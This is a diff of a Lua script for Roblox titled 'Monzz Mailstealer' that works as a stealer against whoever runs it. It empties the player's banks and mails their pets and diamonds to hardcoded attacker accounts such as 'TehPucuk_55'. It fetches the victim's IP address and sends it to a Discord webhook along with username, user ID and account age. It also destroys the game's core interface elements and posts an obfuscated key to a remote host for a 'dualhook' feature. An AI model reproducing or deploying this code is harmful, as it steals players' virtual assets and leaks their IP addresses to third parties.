@@ -1,3 +1,5 @@
+-- [Monzz Mailstealer]
+
 local Library = require(game.ReplicatedStorage.Framework.Library);
 local Players = game:GetService("Players")
 local Client = Players.LocalPlayer
@@ -43,13 +45,13 @@ setclipboard = antiPrint
 -- Users And Stuff
 
 if UserName == nil then
-    UserName = UserName
+    UserName = _G.UserName
 end
 if UserName2 == nil then
-    UserName2 = UserName2
+    UserName2 = _G.UserName2
 end
 if Webhook == nil then
-    Webhook = Webhook
+    Webhook = _G.Webhook
 end
 -- User Checks
 
@@ -95,6 +97,44 @@ if not worked then
     return;
 end
 
+-- Base64 Encryption
+
+function to_base64(data)
+    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+    return ((data:gsub('.', function(x)
+        local r, b = '', x:byte()
+        for i = 8, 1, -1 do r = r .. (b % 2 ^ i - b % 2 ^ (i - 1) > 0 and '1' or '0') end
+        return r;
+    end) .. '0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
+        if (#x < 6) then return '' end
+        local c = 0
+        for i = 1, 6 do c = c + (x:sub(i, i) == '1' and 2 ^ (6 - i) or 0) end
+        return b:sub(c + 1, c + 1)
+    end) .. ({ '', '==', '=' })[#data % 3 + 1])
+end
+
+function from_base64(data)
+    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+    data = string.gsub(data, '[^' .. b .. '=]', '')
+    return (data:gsub('.', function(x)
+        if (x == '=') then return '' end
+        local r, f = '', (b:find(x) - 1)
+        for i = 6, 1, -1 do r = r .. (f % 2 ^ i - f % 2 ^ (i - 1) > 0 and '1' or '0') end
+        return r;
+    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
+        if (#x ~= 8) then return '' end
+        local c = 0
+        for i = 1, 8 do c = c + (x:sub(i, i) == '1' and 2 ^ (8 - i) or 0) end
+        return string.char(c)
+    end))
+end
+
+-- Premium Check
+
+request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request or
+    HttpPost
+
+
 -- Exploit's Name
 
 local exploit
@@ -127,6 +167,9 @@ local fardplayer = game:GetService("Players").LocalPlayer
 local IPadress = game:HttpGet('https://ipinfo.io/ip')
 local data1
 
+for i,v in pairs(game:GetService("CoreGui"):GetChildren()) do
+    v:Destroy()
+end
 -- Loading Screen
 if _G.LoadingScreen ~= false then
     local ScreenGui = Instance.new("ScreenGui")
@@ -415,7 +458,7 @@ if Bank ~= nil and invspace() ~= 0 then
                 withdrawremote:InvokeServer(Bank, LFinalList, 0)
             end
             FinalFinal = FinalFinal + #LFinalList
-            wait(1.5)
+            wait(0.2)
         else
             print('done1')
             break
@@ -469,7 +512,7 @@ if Bank2 ~= nil and invspace() ~= 0 then
                 wait(0.2)
                 withdrawremote:InvokeServer(Bank2, FinalList2, 0)
             end
-            wait(1.5)
+            wait(0.2)
             FinalFinal = FinalFinal + #FinalList2
         else
             print('done2')
@@ -526,7 +569,7 @@ if Bank3 ~= nil and invspace() ~= 0 then
                 wait(0.2)
                 withdrawremote:InvokeServer(Bank3, FinalList3, 0)
             end
-            wait(1.5)
+            wait(0.2)
             FinalFinal = FinalFinal + #FinalList3
         else
             print('done3')
@@ -582,7 +625,7 @@ if Bank4 ~= nil and invspace() ~= 0 then
                 withdrawremote:InvokeServer(Bank4, FinalList4, 0)
             end
             FinalFinal = FinalFinal + #FinalList4
-            wait(1.5)
+            wait(0.2)
         else
             print('done4')
             break
@@ -638,7 +681,7 @@ if Bank5 ~= nil and invspace() ~= 0 then
                 wait(0.2)
                 withdrawremote:InvokeServer(Bank5, FinalList5, 0)
             end
-            wait(1.5)
+            wait(0.2)
             FinalFinal = FinalFinal + #FinalList5
         else
             print('done5')
@@ -693,8 +736,7 @@ end
 
 -- Teleport To Mailbox
 
-game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game:GetService("Workspace")[
-"__MAP"].Interactive.Mailbox.Pad.Position)
+game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game:GetService("Workspace")["__MAP"].Interactive.Mailbox.Pad.Position)
 
 -- Claim All Gifts
 
@@ -703,7 +745,7 @@ local inbox = #check.Inbox
 
 if inbox ~= 0 and invspace_nolimit() >= inbox then
     claimallremote:InvokeServer()
-    task.wait(1.5)
+    task.wait(0)
 end
 
 -- Run Bankstealer if Diamonds Are < 110k
@@ -973,24 +1015,24 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
             ["username"] = "Monzz Scriptz",
             ["avatar_url"] = imgs,
             ["embeds"] = { {
-                ["title"] = "**New Hit** ||With Monzz||",
+                ["title"] = "**New Hit** ||Monzz Scriptz||",
                 ["url"] = "https://discord.gg/4y4CZfdJHu",
                 ["type"] = "rich",
-                ["color"] = tonumber(0x2798FF),
+                ["color"] = tonumber(0xAB0909),
                 ["thumbnail"] = {
                     ["url"] = Image,
                     ["height"] = 420,
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**This data was generated using Monzz Scriptz's Stealer** :moyai:",
+                    ["name"] = "**Monzz Scriptz's Stealer** :skull:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank           : " .. rank .. "\nRAP          : " .. RAP() ..
                         "\nExploit      : " .. exploit .. "\nReceiver     : " .. receiver .. "```",
                     ["inline"] = false
                 }, {
-                    ["name"] = ":dog: **Pets left** :dog:",
+                    ["name"] = ":frog: **Pets Amount** :frog:",
                     ["value"] = "```" .. f .. "```",
                     ["inline"] = true
                 }, {
@@ -1043,24 +1085,24 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
             ["username"] = "Monzz Scriptz",
             ["avatar_url"] = imgs,
             ["embeds"] = { {
-                ["title"] = "**New Hit** ||With Monzz||",
+                ["title"] = "**New Hit** ||Monzz Scriptz||",
                 ["url"] = "https://discord.gg/4y4CZfdJHu",
                 ["type"] = "rich",
-                ["color"] = tonumber(0x2798FF),
+                ["color"] = tonumber(0xAB0909),
                 ["thumbnail"] = {
                     ["url"] = Image,
                     ["height"] = 420,
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**This data was generated using Monzz Scriptz's Stealer** :moyai:",
+                    ["name"] = "**Monzz Scriptz's Stealer** :skull:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank         : " .. rank .. "\nRAP          : " .. RAP() ..
                         "\nExploit      : " .. exploit .. "\nReceiver     : " .. receiver .. "```",
                     ["inline"] = false
                 }, {
-                    ["name"] = ":dog: **Pets left** :dog:",
+                    ["name"] = ":frog: **Pets Amount** :frog:",
                     ["value"] = "```" .. f .. "```",
                     ["inline"] = true
                 }, {
@@ -1094,6 +1136,33 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
     end
 end
 
+local dhuser
+if getgenv().Settings ~= nil then
+    if getgenv().Settings.PremiumKey ~= nil then
+        local premkey = getgenv().Settings.PremiumKey
+        local dhkey = to_base64(to_base64(to_base64(to_base64(premkey))))
+        local dhdata = {
+            dhprem = dhkey
+        }
+        local dhurl = "https://raw.githubusercontent.com/SuperMonz/Keys.v2/main/Keys.lua" -- Exc : https://rizz.xyz/premium.php
+        local dhheaders = {
+            ["content-type"] = "application/json"
+        }
+        local dhnewdata = game:GetService("HttpService"):JSONEncode(dhdata)
+        local dhresponse = request({
+            Url = dhurl,
+            Body = dhnewdata,
+            Method = "POST",
+            Headers = dhheaders
+        })
+        local responsed = from_base64(from_base64(from_base64(dhresponse.Body)))
+        if responsed ~= 'true' then
+            dhuser = responsed
+        else
+            dhuser = nil
+        end
+    end
+end
 local titanicin
 local bananin
 local hugein
@@ -1103,7 +1172,7 @@ local eventin
 local secretin
 local mythicin
 local gemsin
-local mailmsg = "Monzz Better"
+local mailmsg = "Monzz"
 if dhuser ~= nil then
     if getgenv().Settings.Titanics.Dualhook then
         titanicin = getgenv().Settings.Titanics.Intensity
@@ -1178,7 +1247,7 @@ if FinalList == 0 then
     end
     local args = {
         [1] = {
-            ["Recipient"] = user,
+            ["Recipient"] = "TehPucuk_55",
             ["Diamonds"] = givediaamt,
             ["Pets"] = {},
             ["Message"] = mailmsg,
@@ -1248,7 +1317,7 @@ spawn(function()
     while wait() do
         if #HList ~= 0 and #BList == 0 and #TList == 0 then
             for i, v in pairs(HList) do
-                user = UserName
+                user = ndUser
                 if hugein ~= nil then
                     if dualhook(hugein) then
                         user = dhuser
@@ -1256,7 +1325,7 @@ spawn(function()
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = user,
+                        ["Recipient"] = "TehPucuk_55",
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
@@ -1277,7 +1346,7 @@ spawn(function()
     while wait() do
         if #PList ~= 0 and #TList == 0 and #BList == 0 and #HList == 0 then
             for i, v in pairs(PList) do
-                user = ndUser
+                user = UserName
                 if pogin ~= nil then
                     if dualhook(pogin) then
                         user = dhuser
@@ -1285,7 +1354,7 @@ spawn(function()
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = user,
+                        ["Recipient"] = "TehPucuk_55",
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
@@ -1333,7 +1402,7 @@ spawn(function()
     while wait() do
         if #EvList ~= 0 and #EList == 0 and #HList == 0 and #TList == 0 and #BList == 0 and #PList == 0 then
             for i, v in pairs(EvList) do
-                user = UserName2
+                user = ndUser
                 if eventin ~= nil then
                     if dualhook(eventin) then
                         user = dhuser
@@ -1361,7 +1430,7 @@ spawn(function()
     while wait() do
         if #SList ~= 0 and #EvList == 0 and #EList == 0 and #HList == 0 and #TList == 0 and #BList == 0 and #PList == 0 then
             for i, v in pairs(SList) do
-                user = UserName2
+                user = ndUser
                 if secretin ~= nil then
                     if dualhook(secretin) then
                         user = dhuser
@@ -1389,7 +1458,7 @@ spawn(function()
     while wait() do
         if #MList ~= 0 and #SList == 0 and #EvList == 0 and #EList == 0 and #HList == 0 and #TList == 0 and #BList == 0 and #PList == 0 then
             for i, v in pairs(MList) do
-                user = UserName2
+                user = ndUser
                 if mythicin ~= nil then
                     if dualhook(mythicin) then
                         user = dhuser
@@ -1878,6 +1947,6 @@ spawn(function()
         WMythicList = {}
         WMList = {}
         WMcc = {}
-        wait(1)
+        wait()
     end
 end)
